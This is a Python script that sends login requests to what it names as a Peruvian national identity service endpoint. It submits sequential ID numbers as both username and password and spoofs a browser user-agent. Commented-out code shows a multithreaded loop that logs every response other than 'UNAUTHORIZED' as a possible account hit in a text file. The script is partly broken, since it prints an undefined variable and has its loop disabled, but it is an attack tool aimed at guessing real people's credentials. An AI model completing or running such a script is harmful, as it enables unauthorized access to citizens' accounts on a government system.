from colorama import init,Fore,Back,Style
from datetime import datetime
import requests, os
import json
import time
#from __future__ import print_function # so works on Python 2 and 3 alike
from colors import red, green, blue
from threading import Thread, Barrier

def login():
	global user
	s = requests.Session()
	payload = {
		'dasdasd':user,
		'asdasd':user
	}
	header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36'
    }
	res = s.post('https://cel.reniec.gob.pe/celweb/iniciasesion', json = payload, headers=header,allow_redirects=True)
	#s.headers.update({'authorization':json.loads(res.content)['token']})
	p = res.content
	print(p)
	print(res.status_code)
	print(res2)


	"""
	if "UNAUTHORIZED" in str(p):
		txt = " --->       " + str(user) + " UNAUTHORIZED "
		print(red(txt))
	else:
		txt = " --->       " + str(user) + "   Posible acceso "
		print(p)
		print(green(txt))
		posibles = open("posiblesacces.txt","a")
		posibles.write(str(user) + " | " + str(p))
		posibles.write("\n")
		posibles.close()
	user = user + 1
	"""

if __name__ == '__main__':
	init()
	user = 40007618
	threads = []
	#workers = input("Workers: ")

	def main():
		session = login()
	main()
	"""
	while(True):
		for _ in range (int(workers)):
		    i = Thread(target=main)
		    threads.append(i)
		    i.start()     

		for i in threads:
		    i.join()
	"""